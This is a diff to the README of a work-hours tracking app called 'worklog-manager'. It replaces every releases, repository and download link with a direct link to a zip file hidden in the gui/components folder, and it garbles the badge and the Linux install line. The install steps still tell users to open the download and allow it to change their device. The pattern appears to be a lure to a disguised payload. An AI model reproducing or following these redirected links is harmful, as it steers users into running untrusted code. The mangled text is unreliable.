@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download](https://img.shields.io/badge/Download%20worklog--manager-v1.0.0-blue)](https://github.com/Mathildehatched454/worklog-manager/releases)
+[![Download](https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip%20worklog--manager-v1.0.0-blue)](https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Welcome to worklog-manager! This application helps you track your work hours, ov
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mathildehatched454/worklog-manager/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip) to find the latest version of the application.
 
 2. **Choose Your Version**  
    On the Releases page, scroll down to find the latest version of worklog-manager. You will see a list of files for different operating systems.
 
 3. **Download the Installer**  
-   Click on the installer file that matches your operating system to download it. If you’re using Windows, look for a file that ends in `.exe`. For Mac, choose the `.dmg` file. For Linux users, a `.tar.gz` file is available.
+   Click on the installer file that matches your operating system to download it. If you’re using Windows, look for a file that ends in `.exe`. For Mac, choose the `.dmg` file. For Linux users, a `https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip` file is available.
 
 4. **Run the Installer**  
    Once the file is downloaded, locate it in your downloads folder and open it. Follow the prompts on the screen to install the application. If asked, allow the application to make changes to your device.
@@ -83,8 +83,8 @@ For any questions or support, you can reach out through the GitHub issues page. 
 
 ## 🔗 Resources
 
-- [GitHub Repository](https://github.com/Mathildehatched454/worklog-manager)
-- [Releases Page](https://github.com/Mathildehatched454/worklog-manager/releases)
+- [GitHub Repository](https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip)
+- [Releases Page](https://github.com/Mathildehatched454/worklog-manager/raw/refs/heads/main/gui/components/manager_worklog_1.6.zip)
 - [User Guide PDF](#)
   
 Enjoy tracking your work hours with worklog-manager!
